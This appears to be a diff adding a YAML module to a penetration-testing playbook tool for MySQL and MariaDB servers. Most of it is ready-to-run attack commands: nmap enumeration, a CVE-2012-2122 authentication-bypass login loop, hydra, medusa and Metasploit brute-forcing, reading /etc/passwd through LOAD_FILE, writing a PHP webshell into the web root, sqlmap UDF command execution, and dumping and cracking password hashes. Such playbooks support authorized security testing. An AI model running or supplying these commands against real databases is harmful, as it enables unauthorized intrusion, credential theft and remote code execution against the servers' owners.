@@ -1,0 +1,102 @@
+module: mysql
+name: MySQL / MariaDB (3306)
+inputs: [USERS, PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version + default scripts
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          nmap -p$PORT --script=mysql-info $IP
+      - id: banner
+        text: Banner / handshake grab
+        commands: |
+          mysql -h $IP -P $PORT
+          nc -nv $IP $PORT
+
+  - id: fingerprint
+    name: Fingerprinting & Enumeration
+    steps:
+      - id: connect
+        text: Authenticated connect
+        commands: |
+          mysql -h $IP -P $PORT -u $USER -p'$PASS'
+      - id: enum_scripts
+        text: NSE enumeration (databases / users / variables)
+        commands: |
+          nmap -p$PORT --script=mysql-databases,mysql-users,mysql-variables --script-args="mysqluser=$USER,mysqlpass=$PASS" $IP
+      - id: schema
+        text: Databases / tables / current privileges
+        commands: |
+          # SHOW DATABASES;  SELECT current_user();  SHOW GRANTS;
+          # SELECT schema_name FROM information_schema.schemata;
+      - id: creds_in_db
+        text: Hunt for stored app / user credentials
+        manual: true
+        commands: |
+          # SELECT user,authentication_string FROM mysql.user;
+          # SELECT user,password FROM mysql.user;  -- older
+
+  - id: vuln
+    name: Vulnerability Identification
+    steps:
+      - id: cve_map
+        text: Version to CVE mapping
+        commands: |
+          searchsploit mysql
+          searchsploit mariadb
+      - id: auth_bypass
+        text: Check CVE-2012-2122 auth bypass (repeat login)
+        commands: |
+          nmap -p$PORT --script=mysql-vuln-cve2012-2122 $IP
+          for i in $(seq 1 1000); do mysql -h $IP -P $PORT -u root --password=bad 2>/dev/null; done
+      - id: empty_pw
+        text: Check blank-password accounts
+        commands: |
+          nmap -p$PORT --script=mysql-empty-password $IP
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: brute
+        text: Credential brute-force
+        commands: |
+          hydra -L $USERLIST -P $PASSLIST mysql://$IP -s $PORT
+          medusa -h $IP -U $USERLIST -P $PASSLIST -M mysql -n $PORT
+          nmap -p$PORT --script=mysql-brute --script-args userdb=$USERLIST,passdb=$PASSLIST $IP
+      - id: brute_msf
+        text: Brute-force via Metasploit
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/mysql/mysql_login; set RHOSTS $IP; set RPORT $PORT; set USER_FILE $USERLIST; set PASS_FILE $PASSLIST; run; exit"
+
+  - id: exploit
+    name: File Access, RCE & Post-Access
+    authorized: true
+    steps:
+      - id: file_read
+        text: Read local files (FILE priv)
+        commands: |
+          # SELECT LOAD_FILE('/etc/passwd');
+          # SHOW VARIABLES LIKE 'secure_file_priv';
+      - id: file_write
+        text: Write files / drop webshell (FILE priv + writable webroot)
+        manual: true
+        commands: |
+          # SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/s.php';
+      - id: udf
+        text: UDF privesc to command execution (lib_mysqludf_sys)
+        manual: true
+        commands: |
+          # sqlmap ... --os-shell   (automates UDF), or manual raptor_udf2
+          sqlmap -d "mysql://$USER:$PASS@$IP:$PORT/mysql" --os-shell
+      - id: hashdump
+        text: Dump and crack MySQL user hashes
+        manual: true
+        commands: |
+          # SELECT user,authentication_string FROM mysql.user;
+          # hashcat -m 300 (mysql4.1+) hashes $PASSLIST
